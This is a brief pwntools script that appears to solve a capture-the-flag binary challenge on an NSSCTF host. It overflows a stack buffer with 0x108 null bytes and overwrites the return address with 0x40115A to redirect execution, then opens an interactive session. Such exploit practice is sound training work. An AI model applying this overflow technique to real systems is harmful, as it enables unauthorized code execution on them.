#!/usr/bin/python3
# -*- encoding: utf-8 -*-

from pwn import *

# context.log_level = "debug"

p = remote("node6.anna.nssctf.cn", 22398)
# p = process("./pwn-ubuntu_20.04/src/attachment")
elf = ELF("./pwn-ubuntu_20.04/src/attachment")
_libc = ELF('./pwn-ubuntu_20.04/src/libc.so.6')

target_address = 0x40115A

# 64位
context(arch="amd64",os="linux")
stack_len = 0x100 + 0x8

payload = b'\x00'*stack_len + p64(target_address)

p.sendline(payload)

p.interactive()